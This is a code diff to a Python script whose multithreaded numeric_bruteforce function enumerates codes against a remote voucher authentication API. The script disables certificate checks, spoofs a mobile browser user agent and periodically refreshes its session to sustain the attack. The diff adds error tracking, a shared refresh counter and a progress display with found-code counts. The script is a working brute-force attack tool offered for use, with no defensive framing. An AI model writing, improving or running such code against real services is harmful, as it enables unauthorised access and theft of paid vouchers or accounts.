@@ -240,13 +240,17 @@ def numeric_bruteforce(length):
     STOP.clear()
     last_tried = 0
     safe_count = 0
+    errors = 0
+    success_count = 0
+    global_refresh_counter = 0
+    REFRESH_LOCK = threading.Lock()
 
     def worker():
+        nonlocal errors, success_count, global_refresh_counter
         sess2 = requests.Session()
         sess2.verify = False
         sess2.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
         api_url = f"{host}/api/auth/voucher/?lang=en_US"
-        local_count = 0
         while not STOP.is_set():
             code_int = bt.claim()
             if code_int is None:
@@ -265,13 +269,27 @@ def numeric_bruteforce(length):
                     if target and len(bt.found) >= target:
                         STOP.set()
                         break
-            except: pass
-            local_count += 1
-            if local_count >= 500:
+                with LOCK: success_count += 1
+            except Exception as e:
+                with LOCK:
+                    errors += 1
+                    if errors == 1:
+                        print(f"\n  [!] First error: {e} | Response status: {r.status_code if 'r' in dir() else 'N/A'}")
+                        try:
+                            print(f"  [!] Response body: {r.text[:200]}")
+                        except: pass
+                    elif errors % 100 == 0:
+                        print(f"\n  [!] {errors} errors so far (e.g.: {type(e).__name__})")
+            # Global session refresh (shared counter across all threads)
+            with REFRESH_LOCK:
+                global_refresh_counter += 1
+                do_refresh = global_refresh_counter >= 500
+                if do_refresh:
+                    global_refresh_counter = 0
+            if do_refresh:
                 ns = refresh_session(host, params)
                 if ns:
                     with LOCK: SID_DATA["sid"] = ns
-                local_count = 0
         sess2.close()
 
     threads = []
@@ -283,17 +301,25 @@ def numeric_bruteforce(length):
     try:
         while any(t.is_alive() for t in threads):
             time.sleep(2)
-            with LOCK: tried = bt.tried
+            with LOCK:
+                tried = bt.tried
+                e = errors
+                s = success_count
             rate = (tried - last_tried) / 2
             rem = bt.total - tried
             eta = fmt_eta(rem, rate) if rate > 0 else "?m"
             pct = tried * 100 / bt.total
-            sys.stdout.write(f"\r  {tried:,}/{bt.total:,} ({pct:.2f}%) | {rate:.0f}/s | ETA: {eta} | Found: {len(bt.found)}")
+            err_pct = e / (tried or 1) * 100
+            warn = " *** HIGH ERROR RATE - API MAY BE BROKEN ***" if err_pct > 50 and tried > 100 else ""
+            sys.stdout.write(f"\r  {tried:,}/{bt.total:,} ({pct:.2f}%) | {rate:.0f}/s | ETA: {eta} | Found: {len(bt.found)} | OK: {s} | ERR: {e} ({err_pct:.0f}%){warn}")
             sys.stdout.flush()
             last_tried = tried
             safe_count += 1
-            if safe_count % 15 == 0:  # Save every ~30 seconds
+            if safe_count % 15 == 0:
                 bt.save(prog_path)
+                # Also save session health info
+                if err_pct > 50 and tried > 500:
+                    pass  # warning already shown
     except KeyboardInterrupt:
         print("\n[Saving...]")
     finally:
